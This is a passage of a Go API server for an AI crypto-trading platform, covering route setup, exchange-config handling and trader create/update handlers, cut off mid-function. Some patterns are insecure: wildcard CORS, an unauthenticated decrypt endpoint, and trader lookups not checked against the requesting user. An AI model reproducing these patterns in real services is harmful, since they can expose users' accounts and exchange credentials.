package api

import (
	"context"
	"encoding/json"
	"fmt"
	"math"
	"net"
	"net/http"
	"nofx/auth"
	"nofx/backtest"
	"nofx/config"
	"nofx/crypto"
	"nofx/logger"
	"nofx/manager"
	"nofx/market"
	"nofx/provider/alpaca"
	"nofx/provider/coinank/coinank_api"
	"nofx/provider/coinank/coinank_enum"
	"nofx/provider/hyperliquid"
	"nofx/provider/twelvedata"
	"nofx/store"
	"nofx/trader"
	"nofx/trader/aster"
	"nofx/trader/binance"
	"nofx/trader/bitget"
	"nofx/trader/bybit"
	"nofx/trader/gate"
	hyperliquidtrader "nofx/trader/hyperliquid"
	"nofx/trader/kucoin"
	"nofx/trader/lighter"
	"nofx/trader/okx"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

const accountPositionsCacheTTL = 5 * time.Second

type ttlCacheEntry struct {
	Body  []byte
	Until time.Time
}

var (
	accountCache   sync.Map // key: traderID string, value: *ttlCacheEntry
	positionsCache sync.Map
)

// Server HTTP API server
type Server struct {
	router          *gin.Engine
	traderManager   *manager.TraderManager
	store           *store.Store
	cryptoHandler   *CryptoHandler
	backtestManager *backtest.Manager
	debateHandler   *DebateHandler
	httpServer      *http.Server
	port            int
}

// NewServer Creates API server
func NewServer(traderManager *manager.TraderManager, st *store.Store, cryptoService *crypto.CryptoService, backtestManager *backtest.Manager, port int) *Server {
	// Set to Release mode (reduce log output)
	gin.SetMode(gin.ReleaseMode)

	router := gin.Default()

	// Enable CORS
	router.Use(corsMiddleware())

	// Create crypto handler
	cryptoHandler := NewCryptoHandler(cryptoService)

	// Create debate store and handler
	debateStore := store.NewDebateStore(st.GormDB())
	if err := debateStore.InitSchema(); err != nil {
		logger.Errorf("Failed to initialize debate schema: %v", err)
	}
	debateHandler := NewDebateHandler(debateStore, st.Strategy(), st.AIModel())
	debateHandler.SetTraderManager(traderManager)

	s := &Server{
		router:          router,
		traderManager:   traderManager,
		store:           st,
		cryptoHandler:   cryptoHandler,
		backtestManager: backtestManager,
		debateHandler:   debateHandler,
		port:            port,
	}

	// Setup routes
	s.setupRoutes()

	return s
}

// corsMiddleware CORS middleware
// "*" allows Railway auto-generated domains and any frontend origin for one-click deploy
func corsMiddleware() gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Writer.Header().Set("Access-Control-Allow-Origin", "*")
		c.Writer.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
		c.Writer.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")

		if c.Request.Method == "OPTIONS" {
			c.AbortWithStatus(http.StatusOK)
			return
		}

		c.Next()
	}
}

// setupRoutes Setup routes
func (s *Server) setupRoutes() {
	// API route group
	api := s.router.Group("/api")
	{
		// Health check
		api.Any("/health", s.handleHealth)

		// Admin login (used in admin mode, public)

		// System supported models and exchanges (no authentication required)
		api.GET("/supported-models", s.handleGetSupportedModels)
		api.GET("/supported-exchanges", s.handleGetSupportedExchanges)

		// System config (no authentication required, for frontend to determine admin mode/registration status)
		api.GET("/config", s.handleGetSystemConfig)

		// Crypto related endpoints (no authentication required)
		api.GET("/crypto/config", s.cryptoHandler.HandleGetCryptoConfig)
		api.GET("/crypto/public-key", s.cryptoHandler.HandleGetPublicKey)
		api.POST("/crypto/decrypt", s.cryptoHandler.HandleDecryptSensitiveData)

		// Public competition data (no authentication required)
		api.GET("/traders", s.handlePublicTraderList)
		api.GET("/competition", s.handlePublicCompetition)
		api.GET("/top-traders", s.handleTopTraders)
		api.GET("/equity-history", s.handleEquityHistory)
		api.POST("/equity-history-batch", s.handleEquityHistoryBatch)
		api.GET("/traders/:id/public-config", s.handleGetPublicTraderConfig)

		// Market data (no authentication required)
		api.GET("/klines", s.handleKlines)
		api.GET("/symbols", s.handleSymbols)

		// Public strategy market (no authentication required)
		api.GET("/strategies/public", s.handlePublicStrategies)

		// Authentication related routes (no authentication required)
		api.POST("/register", s.handleRegister)
		api.POST("/login", s.handleLogin)
		api.POST("/verify-otp", s.handleVerifyOTP)
		api.POST("/complete-registration", s.handleCompleteRegistration)

		// Routes requiring authentication
		protected := api.Group("/", s.authMiddleware())
		{
			// Logout (add to blacklist)
			protected.POST("/logout", s.handleLogout)

			// Server IP query (requires authentication, for whitelist configuration)
			protected.GET("/server-ip", s.handleGetServerIP)

			// AI trader management
			protected.GET("/my-traders", s.handleTraderList)
			protected.GET("/traders/:id/config", s.handleGetTraderConfig)
			protected.POST("/traders", s.handleCreateTrader)
			protected.PUT("/traders/:id", s.handleUpdateTrader)
			protected.DELETE("/traders/:id", s.handleDeleteTrader)
			protected.POST("/traders/:id/start", s.handleStartTrader)
			protected.POST("/traders/:id/stop", s.handleStopTrader)
			protected.PUT("/traders/:id/prompt", s.handleUpdateTraderPrompt)
			protected.POST("/traders/:id/sync-balance", s.handleSyncBalance)
			protected.POST("/traders/:id/close-position", s.handleClosePosition)
			protected.PUT("/traders/:id/competition", s.handleToggleCompetition)
			protected.GET("/traders/:id/grid-risk", s.handleGetGridRiskInfo)

			// AI model configuration
			protected.GET("/models", s.handleGetModelConfigs)
			protected.PUT("/models", s.handleUpdateModelConfigs)

			// Exchange configuration
			protected.GET("/exchanges", s.handleGetExchangeConfigs)
			protected.POST("/exchanges", s.handleCreateExchange)
			protected.PUT("/exchanges", s.handleUpdateExchangeConfigs)
			protected.DELETE("/exchanges/:id", s.handleDeleteExchange)

			// Strategy management
			protected.GET("/strategies", s.handleGetStrategies)
			protected.GET("/strategies/active", s.handleGetActiveStrategy)
			protected.GET("/strategies/default-config", s.handleGetDefaultStrategyConfig)
			protected.POST("/strategies/preview-prompt", s.handlePreviewPrompt)
			protected.POST("/strategies/test-run", s.handleStrategyTestRun)
			protected.GET("/strategies/:id", s.handleGetStrategy)
			protected.POST("/strategies", s.handleCreateStrategy)
			protected.PUT("/strategies/:id", s.handleUpdateStrategy)
			protected.DELETE("/strategies/:id", s.handleDeleteStrategy)
			protected.POST("/strategies/:id/activate", s.handleActivateStrategy)
			protected.POST("/strategies/:id/duplicate", s.handleDuplicateStrategy)

			// Debate Arena
			protected.GET("/debates", s.debateHandler.HandleListDebates)
			protected.GET("/debates/personalities", s.debateHandler.HandleGetPersonalities)
			protected.GET("/debates/:id", s.debateHandler.HandleGetDebate)
			protected.POST("/debates", s.debateHandler.HandleCreateDebate)
			protected.POST("/debates/:id/start", s.debateHandler.HandleStartDebate)
			protected.POST("/debates/:id/cancel", s.debateHandler.HandleCancelDebate)
			protected.POST("/debates/:id/execute", s.debateHandler.HandleExecuteDebate)
			protected.DELETE("/debates/:id", s.debateHandler.HandleDeleteDebate)
			protected.GET("/debates/:id/messages", s.debateHandler.HandleGetMessages)
			protected.GET("/debates/:id/votes", s.debateHandler.HandleGetVotes)
			protected.GET("/debates/:id/stream", s.debateHandler.HandleDebateStream)

			// Data for specified trader (using query parameter ?trader_id=xxx)
			protected.GET("/status", s.handleStatus)
			protected.GET("/account", s.handleAccount)
			protected.GET("/positions", s.handlePositions)
			protected.GET("/positions/history", s.handlePositionHistory)
			protected.GET("/trades", s.handleTrades)
			protected.GET("/orders", s.handleOrders)               // Order list (all orders)
			protected.GET("/orders/:id/fills", s.handleOrderFills) // Order fill details
			protected.GET("/open-orders", s.handleOpenOrders)      // Open orders from exchange (pending SL/TP)
			protected.GET("/decisions", s.handleDecisions)
			protected.GET("/decisions/latest", s.handleLatestDecisions)
			protected.GET("/decisions/export", s.handleDecisionsExport)
			protected.GET("/statistics", s.handleStatistics)
			protected.GET("/statistics/indicator-analysis", s.handleIndicatorAnalysis)

			// Screener 量化雷达（纯内存，禁止在接口内拉 K 线）
			protected.POST("/screener/filter", s.handleScreenerFilter)

			// Backtest routes
			backtest := protected.Group("/backtest")
			s.registerBacktestRoutes(backtest)
		}
	}
}

// handleHealth Health check
func (s *Server) handleHealth(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{
		"status": "ok",
		"time":   c.Request.Context().Value("time"),
	})
}

// handleGetSystemConfig Get system configuration (configuration that client needs to know)
func (s *Server) handleGetSystemConfig(c *gin.Context) {
	cfg := config.Get()

	c.JSON(http.StatusOK, gin.H{
		"registration_enabled": cfg.RegistrationEnabled,
		"btc_eth_leverage":     10, // Default value
		"altcoin_leverage":     5,  // Default value
	})
}

// handleGetServerIP Get server IP address (for whitelist configuration)
func (s *Server) handleGetServerIP(c *gin.Context) {
	// Try to get public IP via third-party API
	publicIP := getPublicIPFromAPI()

	// If third-party API fails, get first public IP from network interface
	if publicIP == "" {
		publicIP = getPublicIPFromInterface()
	}

	// If still cannot get it, return error
	if publicIP == "" {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Unable to get public IP address"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"public_ip": publicIP,
		"message":   "Please add this IP address to the whitelist",
	})
}

// getPublicIPFromAPI Get public IP via third-party API (IPv4 only)
func getPublicIPFromAPI() string {
	// Try multiple public IP query services (IPv4-only endpoints)
	services := []string{
		"https://api4.ipify.org?format=text", // IPv4 only
		"https://ipv4.icanhazip.com",         // IPv4 only
		"https://v4.ident.me",                // IPv4 only
		"https://api.ipify.org?format=text",  // May return IPv4 or IPv6
	}

	client := &http.Client{
		Timeout: 5 * time.Second,
	}

	for _, service := range services {
		resp, err := client.Get(service)
		if err != nil {
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			body := make([]byte, 128)
			n, err := resp.Body.Read(body)
			if err != nil && err.Error() != "EOF" {
				continue
			}

			ip := strings.TrimSpace(string(body[:n]))
			parsedIP := net.ParseIP(ip)
			// Verify if it's a valid IPv4 address (not containing ":")
			if parsedIP != nil && parsedIP.To4() != nil {
				return ip
			}
		}
	}

	return ""
}

// getPublicIPFromInterface Get first public IP from network interface
func getPublicIPFromInterface() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return ""
	}

	for _, iface := range interfaces {
		// Skip disabled interfaces and loopback interfaces
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}

			if ip == nil || ip.IsLoopback() {
				continue
			}

			// Only consider IPv4 addresses
			if ip.To4() != nil {
				ipStr := ip.String()
				// Exclude private IP address ranges
				if !isPrivateIP(ip) {
					return ipStr
				}
			}
		}
	}

	return ""
}

// isPrivateIP Determine if it's a private IP address
func isPrivateIP(ip net.IP) bool {
	// Private IP address ranges:
	// 10.0.0.0/8
	// 172.16.0.0/12
	// 192.168.0.0/16
	privateRanges := []string{
		"10.0.0.0/8",
		"172.16.0.0/12",
		"192.168.0.0/16",
	}

	for _, cidr := range privateRanges {
		_, subnet, _ := net.ParseCIDR(cidr)
		if subnet.Contains(ip) {
			return true
		}
	}

	return false
}

// getTraderFromQuery Get trader from query parameter
func (s *Server) getTraderFromQuery(c *gin.Context) (*manager.TraderManager, string, error) {
	userID := c.GetString("user_id")
	traderID := c.Query("trader_id")

	// Ensure user's traders are loaded into memory
	err := s.traderManager.LoadUserTradersFromStore(s.store, userID)
	if err != nil {
		logger.Infof("⚠️ Failed to load traders for user %s: %v", userID, err)
	}

	if traderID == "" {
		// If no trader_id specified, return first trader for this user
		ids := s.traderManager.GetTraderIDs()
		if len(ids) == 0 {
			return nil, "", fmt.Errorf("No available traders")
		}

		// Get user's trader list, prioritize returning user's own traders
		userTraders, err := s.store.Trader().List(userID)
		if err == nil && len(userTraders) > 0 {
			traderID = userTraders[0].ID
		} else {
			traderID = ids[0]
		}
	}

	return s.traderManager, traderID, nil
}

// createTempTraderFromExchangeConfig 根据交易所配置创建临时 Trader，IsTestnet 必须来自 exchangeCfg，禁止写死默认值（避免 50101 环境不匹配）
func (s *Server) createTempTraderFromExchangeConfig(exchangeCfg *store.Exchange, userID string) (trader.Trader, error) {
	if exchangeCfg == nil {
		return nil, fmt.Errorf("exchange config is nil")
	}
	var t trader.Trader
	var err error
	switch exchangeCfg.ExchangeType {
	case "binance":
		t = binance.NewFuturesTraderNoUserStream(string(exchangeCfg.APIKey), string(exchangeCfg.SecretKey), userID, exchangeCfg.Testnet)
	case "hyperliquid":
		t, err = hyperliquidtrader.NewHyperliquidTrader(
			string(exchangeCfg.APIKey),
			exchangeCfg.HyperliquidWalletAddr,
			exchangeCfg.Testnet,
		)
	case "aster":
		t, err = aster.NewAsterTrader(
			exchangeCfg.AsterUser,
			exchangeCfg.AsterSigner,
			string(exchangeCfg.AsterPrivateKey),
		)
	case "bybit":
		t = bybit.NewBybitTrader(string(exchangeCfg.APIKey), string(exchangeCfg.SecretKey))
	case "okx":
		t = okx.NewOKXTrader(
			string(exchangeCfg.APIKey),
			string(exchangeCfg.SecretKey),
			string(exchangeCfg.Passphrase),
			true, // 临时实例默认全仓，实盘由 AutoTrader 传策略 IsCrossMargin
			exchangeCfg.Testnet,
		)
	case "bitget":
		t = bitget.NewBitgetTrader(
			string(exchangeCfg.APIKey),
			string(exchangeCfg.SecretKey),
			string(exchangeCfg.Passphrase),
		)
	case "gate":
		t = gate.NewGateTrader(string(exchangeCfg.APIKey), string(exchangeCfg.SecretKey))
	case "kucoin":
		t = kucoin.NewKuCoinTrader(
			string(exchangeCfg.APIKey),
			string(exchangeCfg.SecretKey),
			string(exchangeCfg.Passphrase),
		)
	case "lighter":
		if exchangeCfg.LighterWalletAddr != "" && string(exchangeCfg.LighterAPIKeyPrivateKey) != "" {
			t, err = lighter.NewLighterTraderV2(
				exchangeCfg.LighterWalletAddr,
				string(exchangeCfg.LighterAPIKeyPrivateKey),
				exchangeCfg.LighterAPIKeyIndex,
				false,
			)
		} else {
			err = fmt.Errorf("Lighter requires wallet address and API Key private key")
		}
	default:
		return nil, fmt.Errorf("unsupported exchange type: %s", exchangeCfg.ExchangeType)
	}
	if err != nil {
		return nil, err
	}
	return t, nil
}

// AI trader management related structures
type CreateTraderRequest struct {
	Name                string  `json:"name" binding:"required"`
	AIModelID           string  `json:"ai_model_id" binding:"required"`
	ExchangeID          string  `json:"exchange_id" binding:"required"`
	StrategyID          string  `json:"strategy_id"` // Strategy ID (new version)
	InitialBalance      float64 `json:"initial_balance"`
	ScanIntervalMinutes int     `json:"scan_interval_minutes"`
	IsCrossMargin       *bool   `json:"is_cross_margin"`     // Pointer type, nil means use default value true
	ShowInCompetition   *bool   `json:"show_in_competition"` // Pointer type, nil means use default value true
	// The following fields are kept for backward compatibility, new version uses strategy config
	BTCETHLeverage       int    `json:"btc_eth_leverage"`
	AltcoinLeverage      int    `json:"altcoin_leverage"`
	TradingSymbols       string `json:"trading_symbols"`
	CustomPrompt         string `json:"custom_prompt"`
	OverrideBasePrompt   bool   `json:"override_base_prompt"`
	SystemPromptTemplate string `json:"system_prompt_template"` // System prompt template name
	UseAI500             bool   `json:"use_ai500"`
	UseOITop             bool   `json:"use_oi_top"`
	IsDryRun             bool   `json:"is_dry_run"`
	VirtualEquity        float64 `json:"virtual_equity"`
}

type ModelConfig struct {
	ID           string `json:"id"`
	Name         string `json:"name"`
	Provider     string `json:"provider"`
	Enabled      bool   `json:"enabled"`
	APIKey       string `json:"apiKey,omitempty"`
	CustomAPIURL string `json:"customApiUrl,omitempty"`
}

// SafeModelConfig Safe model configuration structure (does not contain sensitive information)
type SafeModelConfig struct {
	ID              string `json:"id"`
	Name            string `json:"name"`
	Provider        string `json:"provider"`
	Enabled         bool   `json:"enabled"`
	CustomAPIURL    string `json:"customApiUrl"`    // Custom API URL (usually not sensitive)
	CustomModelName string `json:"customModelName"` // Custom model name (not sensitive)
}

type ExchangeConfig struct {
	ID        string `json:"id"`
	Name      string `json:"name"`
	Type      string `json:"type"` // "cex" or "dex"
	Enabled   bool   `json:"enabled"`
	APIKey    string `json:"apiKey,omitempty"`
	SecretKey string `json:"secretKey,omitempty"`
	Testnet   bool   `json:"testnet,omitempty"`
}

// SafeExchangeConfig Safe exchange configuration structure (does not contain sensitive information)
type SafeExchangeConfig struct {
	ID                    string `json:"id"`            // UUID
	ExchangeType          string `json:"exchange_type"` // "binance", "bybit", "okx", "hyperliquid", "aster", "lighter"
	AccountName           string `json:"account_name"`  // User-defined account name
	Name                  string `json:"name"`          // Display name
	Type                  string `json:"type"`          // "cex" or "dex"
	Enabled               bool   `json:"enabled"`
	Testnet               bool   `json:"testnet"`               // 必须返回，前端依赖此字段显示/回填模拟盘勾选
	HyperliquidWalletAddr string `json:"hyperliquidWalletAddr"` // Hyperliquid wallet address (not sensitive)
	AsterUser             string `json:"asterUser"`             // Aster username (not sensitive)
	AsterSigner           string `json:"asterSigner"`           // Aster signer (not sensitive)
	LighterWalletAddr     string `json:"lighterWalletAddr"`     // LIGHTER wallet address (not sensitive)
}

type UpdateModelConfigRequest struct {
	Models map[string]struct {
		Enabled         bool   `json:"enabled"`
		APIKey          string `json:"api_key"`
		CustomAPIURL    string `json:"custom_api_url"`
		CustomModelName string `json:"custom_model_name"`
	} `json:"models"`
}

type UpdateExchangeConfigRequest struct {
	Exchanges map[string]struct {
		Enabled                 bool   `json:"enabled"`
		APIKey                  string `json:"api_key"`
		SecretKey               string `json:"secret_key"`
		Passphrase              string `json:"passphrase"` // OKX specific
		Testnet                 bool   `json:"testnet"`
		HyperliquidWalletAddr   string `json:"hyperliquid_wallet_addr"`
		AsterUser               string `json:"aster_user"`
		AsterSigner             string `json:"aster_signer"`
		AsterPrivateKey         string `json:"aster_private_key"`
		LighterWalletAddr       string `json:"lighter_wallet_addr"`
		LighterPrivateKey       string `json:"lighter_private_key"`
		LighterAPIKeyPrivateKey string `json:"lighter_api_key_private_key"`
		LighterAPIKeyIndex      int    `json:"lighter_api_key_index"`
	} `json:"exchanges"`
}

// handleCreateTrader Create new AI trader
func (s *Server) handleCreateTrader(c *gin.Context) {
	userID := c.GetString("user_id")
	var req CreateTraderRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// Validate leverage values
	if req.BTCETHLeverage < 0 || req.BTCETHLeverage > 50 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "BTC/ETH leverage must be between 1-50x"})
		return
	}
	if req.AltcoinLeverage < 0 || req.AltcoinLeverage > 20 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Altcoin leverage must be between 1-20x"})
		return
	}

	// Validate trading symbol format
	if req.TradingSymbols != "" {
		symbols := strings.Split(req.TradingSymbols, ",")
		for _, symbol := range symbols {
			symbol = strings.TrimSpace(symbol)
			if symbol != "" && !strings.HasSuffix(strings.ToUpper(symbol), "USDT") {
				c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("Invalid symbol format: %s, must end with USDT", symbol)})
				return
			}
		}
	}

	// Generate trader ID (use short UUID prefix for readability)
	exchangeIDShort := req.ExchangeID
	if len(exchangeIDShort) > 8 {
		exchangeIDShort = exchangeIDShort[:8]
	}
	traderID := fmt.Sprintf("%s_%s_%d", exchangeIDShort, req.AIModelID, time.Now().Unix())

	// Set default values
	isCrossMargin := true // Default to cross margin mode
	if req.IsCrossMargin != nil {
		isCrossMargin = *req.IsCrossMargin
	}

	showInCompetition := true // Default to show in competition
	if req.ShowInCompetition != nil {
		showInCompetition = *req.ShowInCompetition
	}

	// Set leverage default values
	btcEthLeverage := 10 // Default value
	altcoinLeverage := 5 // Default value
	if req.BTCETHLeverage > 0 {
		btcEthLeverage = req.BTCETHLeverage
	}
	if req.AltcoinLeverage > 0 {
		altcoinLeverage = req.AltcoinLeverage
	}

	// Set system prompt template default value
	systemPromptTemplate := "default"
	if req.SystemPromptTemplate != "" {
		systemPromptTemplate = req.SystemPromptTemplate
	}

	// Set scan interval default value
	scanIntervalMinutes := req.ScanIntervalMinutes
	if scanIntervalMinutes < 3 {
		scanIntervalMinutes = 3 // Default 3 minutes, not allowed to be less than 3
	}

	// Query exchange actual balance, override user input
	actualBalance := req.InitialBalance // Default to use user input
	exchanges, err := s.store.Exchange().List(userID)
	if err != nil {
		logger.Infof("⚠️ Failed to get exchange config, using user input for initial balance: %v", err)
	}

	// Find matching exchange configuration
	var exchangeCfg *store.Exchange
	for _, ex := range exchanges {
		if ex.ID == req.ExchangeID {
			exchangeCfg = ex
			break
		}
	}

	if exchangeCfg == nil {
		logger.Infof("⚠️ Exchange %s configuration not found, using user input for initial balance", req.ExchangeID)
	} else if !exchangeCfg.Enabled {
		logger.Infof("⚠️ Exchange %s not enabled, using user input for initial balance", req.ExchangeID)
	} else {
		// Create temporary trader from exchange config (Testnet 必须来自 exchangeCfg，禁止写死)
		tempTrader, createErr := s.createTempTraderFromExchangeConfig(exchangeCfg, userID)
		if createErr != nil {
			logger.Infof("⚠️ Failed to create temporary trader, using user input for initial balance: %v", createErr)
		} else if tempTrader != nil {
			// Query actual balance
			balanceInfo, balanceErr := tempTrader.GetBalance()
			if balanceErr != nil {
				logger.Infof("⚠️ Failed to query exchange balance, using user input for initial balance: %v", balanceErr)
			} else {
				// Extract total equity (account total value = wallet balance + unrealized PnL)
				balanceKeys := []string{"total_equity", "totalWalletBalance", "wallet_balance", "totalEq", "balance"}
				for _, key := range balanceKeys {
					if balance, ok := balanceInfo[key].(float64); ok && balance > 0 {
						actualBalance = balance
						logger.Infof("✓ Queried exchange total equity (%s): %.2f USDT (user input: %.2f USDT)", key, actualBalance, req.InitialBalance)
						break
					}
				}
				if actualBalance <= 0 {
					logger.Infof("⚠️ Unable to extract total equity from balance info, balanceInfo=%v, using user input for initial balance", balanceInfo)
				}
			}
		}
	}

	// Create trader configuration (database entity)
	logger.Infof("🔧 DEBUG: Starting to create trader config, ID=%s, Name=%s, AIModel=%s, Exchange=%s, StrategyID=%s", traderID, req.Name, req.AIModelID, req.ExchangeID, req.StrategyID)
	traderRecord := &store.Trader{
		ID:                   traderID,
		UserID:               userID,
		Name:                 req.Name,
		AIModelID:            req.AIModelID,
		ExchangeID:           req.ExchangeID,
		StrategyID:           req.StrategyID, // Associated strategy ID (new version)
		InitialBalance:       actualBalance,  // Use actual queried balance
		BTCETHLeverage:       btcEthLeverage,
		AltcoinLeverage:      altcoinLeverage,
		TradingSymbols:       req.TradingSymbols,
		UseAI500:             req.UseAI500,
		UseOITop:             req.UseOITop,
		CustomPrompt:         req.CustomPrompt,
		OverrideBasePrompt:   req.OverrideBasePrompt,
		SystemPromptTemplate: systemPromptTemplate,
		IsCrossMargin:        isCrossMargin,
		ShowInCompetition:    showInCompetition,
		ScanIntervalMinutes:  scanIntervalMinutes,
		IsRunning:            false,
		IsDryRun:             req.IsDryRun,
		VirtualEquity:       req.VirtualEquity,
	}
	if traderRecord.VirtualEquity <= 0 && traderRecord.IsDryRun {
		traderRecord.VirtualEquity = 10000
	}

	// Save to database
	logger.Infof("🔧 DEBUG: Preparing to call CreateTrader")
	err = s.store.Trader().Create(traderRecord)
	if err != nil {
		logger.Infof("❌ Failed to create trader: %v", err)
		SafeInternalError(c, "Failed to create trader", err)
		return
	}
	logger.Infof("🔧 DEBUG: CreateTrader succeeded")

	// Immediately load new trader into TraderManager
	logger.Infof("🔧 DEBUG: Preparing to call LoadUserTraders")
	err = s.traderManager.LoadUserTradersFromStore(s.store, userID)
	if err != nil {
		logger.Infof("⚠️ Failed to load user traders into memory: %v", err)
		// Don't return error here since trader was successfully created in database
	}
	logger.Infof("🔧 DEBUG: LoadUserTraders completed")

	logger.Infof("✓ Trader created successfully: %s (model: %s, exchange: %s)", req.Name, req.AIModelID, req.ExchangeID)

	c.JSON(http.StatusCreated, gin.H{
		"trader_id":   traderID,
		"trader_name": req.Name,
		"ai_model":    req.AIModelID,
		"is_running":  false,
	})
}

// UpdateTraderRequest Update trader request
type UpdateTraderRequest struct {
	Name                string  `json:"name" binding:"required"`
	AIModelID           string  `json:"ai_model_id" binding:"required"`
	ExchangeID          string  `json:"exchange_id" binding:"required"`
	StrategyID          string  `json:"strategy_id"` // Strategy ID (new version)
	InitialBalance      float64 `json:"initial_balance"`
	ScanIntervalMinutes int     `json:"scan_interval_minutes"`
	IsCrossMargin       *bool   `json:"is_cross_margin"`
	ShowInCompetition   *bool   `json:"show_in_competition"`
	// The following fields are kept for backward compatibility, new version uses strategy config
	BTCETHLeverage       int    `json:"btc_eth_leverage"`
	AltcoinLeverage      int    `json:"altcoin_leverage"`
	TradingSymbols       string `json:"trading_symbols"`
	CustomPrompt         string `json:"custom_prompt"`
	OverrideBasePrompt   bool   `json:"override_base_prompt"`
	SystemPromptTemplate string  `json:"system_prompt_template"`
	IsDryRun             bool    `json:"is_dry_run"`
	VirtualEquity        float64 `json:"virtual_equity"`
}

// handleUpdateTrader Update trader configuration
func (s *Server) handleUpdateTrader(c *gin.Context) {
	userID := c.GetString("user_id")
	traderID := c.Param("id")

	var req UpdateTraderRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		SafeBadRequest(c, "Invalid request parameters")
		return
	}

	// Check if trader exists and belongs to current user
	traders, err := s.store.Trader().List(userID)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get trader list"})
		return
	}

	var existingTrader *store.Trader
	for _, t := range traders {
		if t.ID == traderID {
			existingTrader = t
			break
		}
	}

	if existingTrader == nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Trader does not exist"})
		return
	}

	// Set default values
	isCrossMargin := existingTrader.IsCrossMargin // Keep original value
	if req.IsCrossMargin != nil {
		isCrossMargin = *req.IsCrossMargin
	}

	showInCompetition := existingTrader.ShowInCompetition // Keep original value
	if req.ShowInCompetition != nil {
		showInCompetition = *req.ShowInCompetition
	}

	// Set leverage default values
	btcEthLeverage := req.BTCETHLeverage
	altcoinLeverage := req.AltcoinLeverage
	if btcEthLeverage <= 0 {
		btcEthLeverage = existingTrader.BTCETHLeverage // Keep original value
	}
	if altcoinLeverage <= 0 {
		altcoinLeverage = existingTrader.AltcoinLeverage // Keep original value
	}

	// Set scan interval, allow updates
	scanIntervalMinutes := req.ScanIntervalMinutes
	logger.Infof("📊 Update trader scan_interval: req=%d, existing=%d", req.ScanIntervalMinutes, existingTrader.ScanIntervalMinutes)
	if scanIntervalMinutes <= 0 {
		scanIntervalMinutes = existingTrader.ScanIntervalMinutes // Keep original value
	} else if scanIntervalMinutes < 3 {
		scanIntervalMinutes = 3
	}
	logger.Infof("📊 Final scan_interval_minutes: %d", scanIntervalMinutes)

	// Set system prompt template
	systemPromptTemplate := req.SystemPromptTemplate
	if systemPromptTemplate == "" {
		systemPromptTemplate = existingTrader.SystemPromptTemplate // Keep original value
	}

	// Handle strategy ID (if not provided, keep original value)
	strategyID := req.StrategyID
	if strategyID == "" {
		strategyID = existingTrader.StrategyID
	}

	isDryRun := req.IsDryRun
	virtualEquity := req.VirtualEquity
	if isDryRun && virtualEquity <= 0 {
		virtualEquity = 10000
	}
	if !isDryRun {
		virtualEquity = 0
	}

	// Update trader configuration
	traderRecord := &store.Trader{
		ID:                   traderID,
		UserID:               userID,
		Name:                 req.Name,
		AIModelID:            req.AIModelID,
		ExchangeID:           req.ExchangeID,
		StrategyID:           strategyID, // Associated strategy ID
		InitialBalance:       req.InitialBalance,
		BTCETHLeverage:       btcEthLeverage,
		AltcoinLeverage:      altcoinLeverage,
		TradingSymbols:       req.TradingSymbols,
		CustomPrompt:         req.CustomPrompt,
		OverrideBasePrompt:   req.OverrideBasePrompt,
		SystemPromptTemplate: systemPromptTemplate,
		IsCrossMargin:        isCrossMargin,
		ShowInCompetition:    showInCompetition,
		ScanIntervalMinutes:  scanIntervalMinutes,
		IsRunning:            existingTrader.IsRunning, // Keep original value
		IsDryRun:             isDryRun,
		VirtualEquity:        virtualEquity,
	}

	// Check if trader was running before update (we'll restart it after)
	wasRunning := false
	if existingMemTrader, memErr := s.traderManager.GetTrader(traderID); memErr == nil {
		status := existingMemTrader.GetStatus()
		if running, ok := status["is_running"].(bool); ok && running {
			wasRunning = true
			logger.Infof("🔄 Trader %s was running, will restart with new config after update", traderID)
		}
	}

	// Update database
	logger.Infof("🔄 Updating trader: ID=%s, Name=%s, AIModelID=%s, StrategyID=%s, ScanInterval=%d min",
		traderRecord.ID, traderRecord.Name, traderRecord.AIModelID, traderRecord.StrategyID, scanIntervalMinutes)
	err = s.store.Trader().Update(traderRecord)
	if err != nil {
		SafeInternalError(c, "Failed to update trader", err)
		return
	}

	// Remove old trader from memory first (this also stops if running)
	s.traderManager.RemoveTrader(traderID)

	// Reload traders into memory with fresh config
	err = s.traderManager.LoadUserTradersFromStore(s.store, userID)
	if err != nil {
		logger.Infof("⚠️ Failed to reload user traders into memory: %v", err)
	}

	// If trader was running before, restart it with new config
	if wasRunning {
		if reloadedTrader, getErr := s.traderManager.GetTrader(traderID); getErr == nil {
			go func() {
				logger.Infof("▶️ Restarting trader %s with new config...", traderID)
				if runErr := reloadedTrader.Run(); runErr != nil {
					logger.Infof("❌ Trader %s runtime error: %v", traderID, runErr)
				}
			}()
		}
	}

	logger.Infof("✓ Trader updated successfully: %s (model: %s, exchange: %s, strategy: %s)", req.Name, req.AIModelID, req.ExchangeID, strategyID)

	c.JSON(http.StatusOK, gin.H{
		"trader_id":   traderID,
		"trader_name": req.Name,
		"ai_model":    req.AIModelID,
		"message":     "Trader updated successfully",
	})
}

// handleDeleteTrader Delete trader
func (s *Server) handleDeleteTrader(c *gin.Context) {
	userID := c.GetString("user_id")
	traderID := c.Param("id")

	// Delete from database
	err := s.store.Trader().Delete(userID, traderID)
	if err != nil {
		SafeInternalError(c, "Failed to delete trader", err)
		return
	}

	// If trader is running, stop it first
	if trader, err := s.traderManager.GetTrader(traderID); err == nil {
		status := trader.GetStatus()
